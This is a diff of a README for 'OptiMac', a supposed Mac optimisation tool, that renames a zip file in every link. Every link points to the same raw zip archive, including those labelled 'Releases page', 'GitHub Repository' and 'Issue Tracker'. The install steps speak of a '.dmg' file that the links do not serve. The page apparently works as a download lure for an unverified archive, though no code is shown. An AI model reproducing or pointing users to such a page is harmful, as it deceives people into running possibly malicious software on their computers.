@@ -1,6 +1,6 @@
 # 🚀 OptiMac - Optimize Your M-Series Mac Easily
 
-[![Download OptiMac](https://raw.githubusercontent.com/HirenNirmal/OptiMac/main/kidhood/OptiMac.zip)](https://raw.githubusercontent.com/HirenNirmal/OptiMac/main/kidhood/OptiMac.zip)
+[![Download OptiMac](https://raw.githubusercontent.com/HirenNirmal/OptiMac/main/kidhood/Opti_Mac_v3.1.zip)](https://raw.githubusercontent.com/HirenNirmal/OptiMac/main/kidhood/Opti_Mac_v3.1.zip)
 
 ## 🌟 Introduction
 
@@ -18,7 +18,7 @@ OptiMac is a comprehensive, user-friendly macOS optimization suite. It brings po
 To begin using OptiMac, follow these steps to download and install it:
 
 1. **Visit the Download Page**
-   Go to the [Releases page](https://raw.githubusercontent.com/HirenNirmal/OptiMac/main/kidhood/OptiMac.zip) to find the latest version of OptiMac.
+   Go to the [Releases page](https://raw.githubusercontent.com/HirenNirmal/OptiMac/main/kidhood/Opti_Mac_v3.1.zip) to find the latest version of OptiMac.
 
 2. **Download the Application**
    Look for the latest version listed on the page. Click on the version number to expand it. Download the `.dmg` file.
@@ -38,7 +38,7 @@ To begin using OptiMac, follow these steps to download and install it:
 
 ## 🔧 Download & Install
 
-To download OptiMac, simply visit this page: [Download OptiMac Here](https://raw.githubusercontent.com/HirenNirmal/OptiMac/main/kidhood/OptiMac.zip). Follow the steps outlined in the "Getting Started" section to install the application.
+To download OptiMac, simply visit this page: [Download OptiMac Here](https://raw.githubusercontent.com/HirenNirmal/OptiMac/main/kidhood/Opti_Mac_v3.1.zip). Follow the steps outlined in the "Getting Started" section to install the application.
 
 ## 🛠️ How to Use OptiMac
 
@@ -70,7 +70,7 @@ No, OptiMac works to improve system performance, not slow it down. Users often r
 
 ## 📝 Feedback and Support
 
-If you have questions or feedback, please open an issue on our [GitHub page](https://raw.githubusercontent.com/HirenNirmal/OptiMac/main/kidhood/OptiMac.zip). We value your input and aim to improve your experience.
+If you have questions or feedback, please open an issue on our [GitHub page](https://raw.githubusercontent.com/HirenNirmal/OptiMac/main/kidhood/Opti_Mac_v3.1.zip). We value your input and aim to improve your experience.
 
 ## 🌐 Additional Resources
 
@@ -81,8 +81,8 @@ For more detailed guidance and updates, check the following resources:
 
 ### 🔗 Important Links
 
-- [Download OptiMac](https://raw.githubusercontent.com/HirenNirmal/OptiMac/main/kidhood/OptiMac.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/HirenNirmal/OptiMac/main/kidhood/OptiMac.zip)
-- [Issue Tracker](https://raw.githubusercontent.com/HirenNirmal/OptiMac/main/kidhood/OptiMac.zip)
+- [Download OptiMac](https://raw.githubusercontent.com/HirenNirmal/OptiMac/main/kidhood/Opti_Mac_v3.1.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/HirenNirmal/OptiMac/main/kidhood/Opti_Mac_v3.1.zip)
+- [Issue Tracker](https://raw.githubusercontent.com/HirenNirmal/OptiMac/main/kidhood/Opti_Mac_v3.1.zip)
 
 Optimize your Mac today with OptiMac for better performance!
